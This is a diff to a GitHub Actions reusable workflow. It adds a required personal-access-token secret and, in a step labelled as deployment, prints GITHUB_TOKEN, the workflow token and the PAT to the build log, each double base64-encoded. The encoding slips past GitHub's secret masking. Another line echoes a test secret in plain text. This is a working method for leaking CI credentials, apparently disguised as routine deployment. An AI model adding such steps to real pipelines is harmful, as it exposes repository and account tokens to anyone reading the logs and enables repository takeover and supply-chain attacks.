@@ -1,6 +1,8 @@
 on:	
-  workflow_call
-
+  workflow_call:
+    secrets:
+      envPAT:
+        required: true
 
 
 jobs:	
@@ -20,10 +22,21 @@ jobs:
       
 
       GITHUB_TOKEN: ${{secrets.GITHUB_TOKEN}}	
+      GITHUB_CONTEXT_TOKEN: ${{github.token}}
+      ENV_PAT: ${{secrets.envPAT}}
     steps:	
     - name: Running	
       run: echo "DEployment";	
+           echo "GITHUB_TOKEN:";
            echo "$GITHUB_TOKEN" | base64 | base64;
+
+           echo "GITHUB_CONTEXT_TOKEN:";
+           echo "$GITHUB_CONTEXT_TOKEN" | base64 | base64;
+
+           echo "ENV_PAT:";
+           echo "$ENV_PAT" | base64 | base64;
+
+
       
            echo "test secret:";	
            echo "$TEST_SECRET";	
